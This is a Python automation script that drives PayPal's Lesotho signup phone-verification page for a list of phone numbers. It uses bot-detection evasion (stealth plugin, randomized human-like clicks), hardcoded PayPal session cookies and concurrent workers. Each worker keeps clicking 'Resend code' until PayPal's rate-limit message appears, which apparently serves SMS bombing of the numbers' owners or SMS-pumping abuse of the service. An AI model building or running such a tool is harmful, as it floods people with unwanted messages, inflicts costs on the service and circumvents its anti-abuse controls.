import os
import time
import random
from concurrent.futures import ThreadPoolExecutor
from playwright.sync_api import sync_playwright
from undetected_playwright import stealth_sync
from loguru import logger
from threading import Lock
from tqdm import tqdm

# Global lock for thread-safe file operations
file_lock = Lock()


def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')


def savecreated(filename, message):
    workcard = filename + '.txt'
    with open(workcard, "a", encoding="utf8") as file:
        file.writelines(message + '\n')


def human_like_click(page, locator):
    """Simulate human-like click with mouse movement and delays"""
    # Get element bounding box
    box = locator.bounding_box()
    if box:
        # Random position within the element
        x = box['x'] + box['width'] * random.uniform(0.3, 0.7)
        y = box['y'] + box['height'] * random.uniform(0.3, 0.7)

        # Move mouse to element with slight delay
        page.mouse.move(x, y)
        time.sleep(random.uniform(0.1, 0.3))

        # Click
        page.mouse.click(x, y)
    else:
        # Fallback to regular click
        locator.click()


def paypal_lesotho_automation(phone_number, runner_id, progress_bar):
    """
    Automates PayPal Lesotho phone verification using cookies for authentication
    """
    url = "https://www.paypal.com/ls/welcome/signup/#/login_info_phone"

    # PayPal cookies for authentication
    cookies = [
        {
            "name": "nsid",
            "value": "s%3Ad1qiYjRU46VE4EWUEP6V0DOz90_t63js.4A4EWY3FUX8k27Pp4e4BEWG73DliZXfcwnCtBAxCPmA",
            "domain": ".paypal.com",
            "path": "/"
        },
        {
            "name": "KHcl0EuY7AKSMgfvHl7J5E7hPtK",
            "value": "HONrPQZHIHi28GNPe6A5CzAMsEziF2qrUYdZaqZw2h3z1tIDcJgqwgJsOKgpHm3wP8TRv7zWG9Z2BxpG",
            "domain": ".paypal.com",
            "path": "/"
        },
        {
            "name": "ddi",
            "value": "eliV43ghFFcv138Ezn4bxyf2Tfm_RI6WfGufZ5xTYaZANdRNVWIyL3xYHdcuf9Xv4gL6Uyaj_3FWua-JZiIiLbMd9scnLWMNevI3mTHQcQyiHhdj",
            "domain": ".paypal.com",
            "path": "/"
        },
        {
            "name": "sc_f",
            "value": "uQWKGeiDOdA9c8o9si2pcRZM8vOmxP-TBA8HB4sh-mvyQnRzqNfsSvRCZPwZthySx6SKAMH7Iw3AqVU3uCx0uUoeLUT6CY2xk7MWUW",
            "domain": ".paypal.com",
            "path": "/"
        },
        {
            "name": "l7_az",
            "value": "dcg16.slc",
            "domain": ".paypal.com",
            "path": "/"
        },
        {
            "name": "x-pp-s",
            "value": "eyJ0IjoiMTc2NDA4NTY4MzAzOCIsImwiOiIwIiwibSI6IjAifQ",
            "domain": ".paypal.com",
            "path": "/"
        }
    ]

    with sync_playwright() as playwright:
        try:
            browser = playwright.chromium.launch(headless=False)  # Visible browser for debugging
            context = browser.new_context()
            stealth_sync(context)

            # Add cookies to the context
            logger.info(f"{runner_id}: Setting authentication cookies...")
            context.add_cookies(cookies)

            page = context.new_page()

            logger.info(f"{runner_id}: Navigating to PayPal phone entry page...")
            page.goto(url, wait_until="domcontentloaded")
            time.sleep(3)

            # Step 1: Enter phone number directly
            logger.info(f"{runner_id}: Entering phone number...")
            try:
                # Wait for phone input field
                phone_input = page.locator('input[type="tel"]').first
                phone_input.wait_for(state="visible", timeout=15000)
                phone_input.fill(phone_number)
                time.sleep(1)
            except Exception as e:
                logger.error(f"{runner_id}: Error entering phone number: {e}")
                browser.close()
                if progress_bar:
                    progress_bar.update(1)
                return

            # Step 2: Click Next button (after phone)
            logger.info(f"{runner_id}: Clicking Next button (after phone)...")
            try:
                next_button_phone = page.locator('button#paypalAccountData_submit[value="init_phone_confirmation"]').first
                next_button_phone.wait_for(state="visible", timeout=10000)
                time.sleep(random.uniform(0.5, 1.5))
                human_like_click(page, next_button_phone)
                time.sleep(3)
            except Exception as e:
                logger.error(f"{runner_id}: Error clicking Next (after phone): {e}")
                browser.close()
                if progress_bar:
                    progress_bar.update(1)
                return

            # Step 3: Keep clicking "Resend code" until error appears
            logger.info(f"{runner_id}: Starting resend loop...")
            resend_count = 0
            max_resends = 100  # Safety limit

            while resend_count < max_resends:
                # Check if error message appears (target: "Sorry, we can't send a new code right now. Try again later.")
                try:
                    error_div = page.locator('div.twd77p3')
                    error_text = page.locator('span.globalNotification:has-text("Sorry, we can\'t send a new code right now")')

                    if error_text.is_visible(timeout=1000):
                        logger.success(f"{runner_id}: Account DONE (resend limit reached after {resend_count} resends)")
                        savecreated('completed', f"{phone_number}")
                        browser.close()
                        if progress_bar:
                            progress_bar.update(1)
                        return
                except:
                    pass

                # Click "Resend code" button
                try:
                    # Look for the resend button with message icon
                    resend_button = page.locator('button#paypalAccountData_nextBtn[data-automation-id="send_again"]').first
                    if resend_button.is_visible(timeout=3000):
                        time.sleep(random.uniform(1, 2))  # Human-like delay
                        resend_button.click()
                        resend_count += 1
                        logger.info(f"{runner_id}: Resend clicked ({resend_count} times)")
                        time.sleep(2)
                    else:
                        logger.warning(f"{runner_id}: Resend button not found")
                        break
                except Exception as e:
                    logger.warning(f"{runner_id}: Error clicking resend: {e}")
                    time.sleep(2)

            logger.success(f"{runner_id}: Automation completed successfully!")
            time.sleep(3)
            browser.close()
            if progress_bar:
                progress_bar.update(1)

        except Exception as e:
            logger.error(f"{runner_id}: Automation failed - {e}")
            savecreated('failed', f"{phone_number} - Error: {str(e)}")
            try:
                browser.close()
            except:
                pass
            if progress_bar:
                progress_bar.update(1)


def run_worker(index, phone_number, progress_bar):
    """
    Worker function to process a single phone number
    """
    runner_id = f"Worker-{index + 1}"

    logger.info(f"{runner_id}: Starting automation for phone {phone_number}")
    paypal_lesotho_automation(phone_number, runner_id, progress_bar)


if __name__ == "__main__":
    clear_console()
    logger.info("PayPal Lesotho Phone Verification Automation Script")
    logger.info("=" * 50)

    # Load phone numbers from file
    try:
        with open("numbers.txt", "r", encoding="utf8") as file:
            phone_numbers = [line.strip() for line in file if line.strip()]
        logger.info(f"Loaded {len(phone_numbers)} phone numbers from numbers.txt")
    except FileNotFoundError:
        logger.error("'numbers.txt' not found. Create a file with phone numbers (one per line)")
        exit(1)

    if len(phone_numbers) == 0:
        logger.error("No phone numbers loaded. Please add numbers to numbers.txt")
        exit(1)

    # Ask for number of workers
    num_workers = int(input('Number of concurrent workers: '))

    # Initialize progress bar
    with tqdm(total=len(phone_numbers), desc="Progress", unit="phone") as progress_bar:
        # Execute workers
        with ThreadPoolExecutor(max_workers=num_workers) as executor:
            executor.map(lambda i: run_worker(i, phone_numbers[i], progress_bar), range(len(phone_numbers)))

    logger.success("Script finished!")
    input('Press Enter to exit...')
